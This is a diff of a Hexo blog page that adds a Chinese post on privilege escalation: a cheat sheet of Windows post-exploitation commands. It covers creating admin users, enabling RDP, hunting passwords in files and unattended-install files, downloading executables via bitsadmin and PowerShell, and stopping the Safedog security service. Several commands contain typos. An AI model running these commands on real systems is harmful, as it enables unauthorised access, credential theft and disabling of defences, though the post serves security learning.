@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>violin&#39;s blog</title>
+    <title>提权学习（三） · violin&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >violin</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">提权学习（三）</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>violin</a>
 </header>
@@ -220,24 +231,69 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            提权学习（三）
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "提权">提权</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">898</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/07/14</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,39 +394,117 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/08/imgtest/" >
-            
-                <span>hexo写文章教程</span>
-        </a>
-        <div class="abstract-content">
-            <p>hexo写博客文章简易教程
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "hexo">hexo</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="提权基础命令"><a href="#提权基础命令" class="headerlink" title="提权基础命令"></a>提权基础命令</h2><p>ifconfig -a：Linux下查看IP地址</p>
+<p>ipconfig /all：Windows下查看IP地址信息</p>
+<p>netstat -ano：获取主机的端口开放情况，采用-anb时需要管理员权限</p>
+<p>net start：查看系``统开放的服务</p>
+<p>net stop servicename：停止服务</p>
+<p>net start servicename：开启服务</p>
+<p>tasklist /svc：获取进程名称、pid、服务<a id="more"></a></p>
+<p>msinfo32：获取系统详细信息，如下将结果输出到文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /wait msinfo32.exe /report c:\list.txt /categories swenv+SWEnvRunningTasks</span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/14/提权学习（三）/1562853881066.png" title="tiquan_3">
+
+<p>命令最后<code>SWEnvRunningTasks</code>部分可以修改为：<code>SWEnvStartupPrograms</code>（获取启动程序相关信息）、<code>SWEnvEnvVars</code>（获取环境变量）</p>
+<p>taskkill /im(pid) imagename(pid) /f：Windows自带进程终止程序,/f强制终止程序，imagename(pid)可以用tasklist获取</p>
+<p>pskill pid(进程名字)：为pstool的一个子程序，与taskkill一样，第一次运行需要运行pskill /accepteula命令</p>
+<p>net user username password /add：添加用户</p>
+<p>net localgroup Administrators username /add：将用户添加到管理员组，添加用户和添加到组可以写在一起：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add &amp; net localgroup Administrators username /add</span><br></pre></td></tr></table></figure>
+
+<p>net localgroup adminstrators：查看管理员组用户</p>
+<p>net user username ：查看指定用户的信息</p>
+<p>net user username /active:yes：激活用户</p>
+<p>net user username password：修改用户密码</p>
+<p>命令行开启3389</p>
+<p>win server 2003</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (_CLASS != &quot;&quot;) call setallowtconnections 1</span><br></pre></td></tr></table></figure>
+
+<p>win server 08、12、win 7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControSet\Control\Terminal Server&quot; /vfSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>server 12和win 7执行前面两条命令即可</p>
+<h2 id="提权基础命令二"><a href="#提权基础命令二" class="headerlink" title="提权基础命令二"></a>提权基础命令二</h2><p>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”</p>
+<img src="/2019/07/14/提权学习（三）/1562938000517.png" title="tiquan_3">
+
+<p>hostname：主机名称</p>
+<p>set：所有环境变量</p>
+<p>route print：路由信息</p>
+<p>arp -a：查看ARP缓存</p>
+<p>netstat -ano：查看网络连接</p>
+<p>查看防火墙规则，状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>
+
+<p>driverquery：查看已安装的驱动列表</p>
+<p>net start：查看已经启动的windows服务</p>
+<p>wmic product list brief：查看已经安装的程序（此命令运行较慢）</p>
+<p>wmic process list brief：查看进程列表</p>
+<p>wmic startup list biref：查看启动程序列表</p>
+<p>wmic service list brief：查看服务列表</p>
+<p>sc qc servicename：查看某个服务的权限</p>
+<p>查看已经按照的更新和日期：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,De**ion,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>结束xx.exe程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;xx.exe&quot; call terminate</span><br></pre></td></tr></table></figure>
+
+<p>dir /b /s：password.txt：搜索password.txt文件，可以用<code>*.</code>进行统配如:*.xls等。</p>
+<p>findstr /si password x.ini x.xml x.txt：在文件中搜索字段</p>
+<img src="/2019/07/14/提权学习（三）/1562940000144.png" title="tiquan_3">
+
+<p>在大型企业中一般采用无人值守安装，可以查找如下文件，通常包含管理员密码的Base64值:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for /d %i in(d:\www\*) do @echo %i  列出d:\www下的所有目录（同样可以用相对路径）</span><br><span class="line">for /d %i in(???) do @echo %i   列出当前目录文件夹名字长度为3目录</span><br><span class="line">for /r %i in(*.exe) do @echo %i 列出当前目录包括子目录中的exe文件</span><br><span class="line">for /r &quot;c:\&quot; %i in (*.*) do @echo %i 列出指定目录中的文件</span><br><span class="line">for /f %i in (c:\test.txt) do @echo %i  输出test.txt中的内容</span><br></pre></td></tr></table></figure>
+
+<p>php.exe “xxx.php”：PHP读文件</p>
+<p>bitsadmin和powershell下载文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfern http://www.test.com/123.exe c:\123.exe</span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://www.test.com/123.exe&apos;,&apos;123.exe&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>注册表关键字搜索：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f 关键字 /t REG_SZ /s</span><br><span class="line">reg query HKCU /f 关键字 /t REG_SZ /s</span><br></pre></td></tr></table></figure>
+
+<p>系统权限配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cacls c:\</span><br><span class="line">cacls c:\windows\123.exe 查看123.exe的权限</span><br></pre></td></tr></table></figure>
+
+<p>如果是system权限，可以用如下的命令停用安全狗：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;Safedog ***&quot; /y   ***表示以Safedog开头的所有服务</span><br></pre></td></tr></table></figure>
+
+
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/07/11/提权学习（二）/" title= "提权学习（二）">
+                    <div class="prevTitle">提权学习（二）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -439,6 +573,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#提权基础命令"><span class="toc-number">1.</span> <span class="toc-text">提权基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权基础命令二"><span class="toc-number">2.</span> <span class="toc-text">提权基础命令二</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -620,6 +772,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
